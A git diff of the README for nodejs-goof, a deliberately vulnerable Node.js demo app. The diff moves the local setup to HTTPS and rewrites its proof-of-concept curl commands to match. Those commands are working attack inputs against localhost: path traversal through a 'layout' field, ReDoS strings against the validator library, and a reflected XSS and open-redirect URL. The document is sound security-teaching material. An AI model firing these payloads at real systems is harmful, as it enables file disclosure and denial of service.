@@ -16,9 +16,10 @@ mongod &
 
 git clone https://github.com/snyk-labs/nodejs-goof
 npm install
-npm start
+openssl req -x509 -newkey rsa:2048 -nodes -keyout server.key -out server.crt -subj '/CN=localhost'
+TLS_KEY_PATH=server.key TLS_CERT_PATH=server.crt npm start
 ```
-This will run Goof locally, using a local mongo on the default port and listening on port 3001 (http://localhost:3001)
+This will run Goof locally, using a local mongo on the default port and listening on port 3001 (https://localhost:3001)
 
 Note: You *have* to use an old version of MongoDB version due to some of these old libraries' database server APIs. MongoDB 3 is known to work ok.
 
@@ -29,6 +30,7 @@ docker run --rm -p 27017:27017 mongo:3
 ```
 
 ## Running with docker-compose
+Export `TLS_KEY` and `TLS_CERT` (or adapt the compose environment to point at mounted certificate files) before starting the stack.
 ```bash
 docker-compose up --build
 docker-compose down
@@ -37,6 +39,7 @@ docker-compose down
 ### Heroku usage
 Goof requires attaching a MongoLab service to be deployed as a Heroku app. 
 That sets up the MONGOLAB_URI env var so everything after should just work. 
+Because Heroku terminates TLS at the router, also set `TRUST_PROXY=1` and `CANONICAL_HOST=<your-app-hostname>` so the app trusts forwarded HTTPS headers and redirects any non-HTTPS requests to the expected host.
 
 ### CloudFoundry usage
 Goof requires attaching a MongoLab service and naming it "goof-mongo" to be deployed on CloudFoundry. 
@@ -85,24 +88,24 @@ The form is completely functional. The way it works is, it receives the profile 
 You'd think that what's the worst that can happen because we use a validation to confirm the expected input, however the validation doesn't take into account a new field that can be added to the object, such as `layout`, which when passed to a template language, could lead to Local File Inclusion (Path Traversal) vulnerabilities. Here is a proof-of-concept showing it:
 
 ```sh
-curl -X 'POST' --cookie c.txt --cookie-jar c.txt -H 'Content-Type: application/json' --data-binary '{"username": "admin@snyk.io", "password": "SuperSecretPassword"}' 'http://localhost:3001/login'
+curl -k -X 'POST' --cookie c.txt --cookie-jar c.txt -H 'Content-Type: application/json' --data-binary '{"username": "admin@snyk.io", "password": "SuperSecretPassword"}' 'https://localhost:3001/login'
 ```
 
 ```sh
-curl -X 'POST' --cookie c.txt --cookie-jar c.txt -H 'Content-Type: application/json' --data-binary '{"email": "admin@snyk.io", "firstname": "admin", "lastname": "admin", "country": "IL", "phone": "+972551234123",  "layout": "./../package.json"}' 'http://localhost:3001/account_details'
+curl -k -X 'POST' --cookie c.txt --cookie-jar c.txt -H 'Content-Type: application/json' --data-binary '{"email": "admin@snyk.io", "firstname": "admin", "lastname": "admin", "country": "IL", "phone": "+972551234123",  "layout": "./../package.json"}' 'https://localhost:3001/account_details'
 ```
 
 Actually, there's even another vulnerability in this code.
 The `validator` library that we use has several known regular expression denial of service vulnerabilities. One of them, is associated with the email regex, which if validated with the `{allow_display_name: true}` option then we can trigger a denial of service for this route:
 
 ```sh
-curl -X 'POST' -H 'Content-Type: application/json' --data-binary "{\"email\": \"`seq -s "" -f "<" 100000`\"}" 'http://localhost:3001/account_details'
+curl -k -X 'POST' -H 'Content-Type: application/json' --data-binary "{\"email\": \"`seq -s "" -f "<" 100000`\"}" 'https://localhost:3001/account_details'
 ```
 
 The `validator.rtrim()` sanitizer is also vulnerable, and we can use this to create a similar denial of service attack:
 
 ```sh
-curl -X 'POST' -H 'Content-Type: application/json' --data-binary "{\"email\": \"someone@example.com\", \"country\": \"nop\", \"phone\": \"0501234123\", \"lastname\": \"nop\", \"firstname\": \"`node -e 'console.log(" ".repeat(100000) + "!")'`\"}" 'http://localhost:3001/account_details'
+curl -k -X 'POST' -H 'Content-Type: application/json' --data-binary "{\"email\": \"someone@example.com\", \"country\": \"nop\", \"phone\": \"0501234123\", \"lastname\": \"nop\", \"firstname\": \"`node -e 'console.log(" ".repeat(100000) + "!")'`\"}" 'https://localhost:3001/account_details'
 ```
 
 #### NoSQL injection
@@ -141,7 +144,7 @@ The `/admin` view introduces a `redirectPage` query path, as follows in the admi
 One fault here is that the `redirectPage` is rendered as raw HTML and not properly escaped, because it uses `<%- >` instead of `<%= >`. That itself, introduces a Cross-site Scripting (XSS) vulnerability via:
 
 ```
-http://localhost:3001/login?redirectPage="><script>alert(1)</script>
+https://localhost:3001/login?redirectPage="><script>alert(1)</script>
 ```
 
 To exploit the open redirect, simply provide a URL such as `redirectPage=https://google.com` which exploits the fact that the code doesn't enforce local URLs in `index.js:72`.
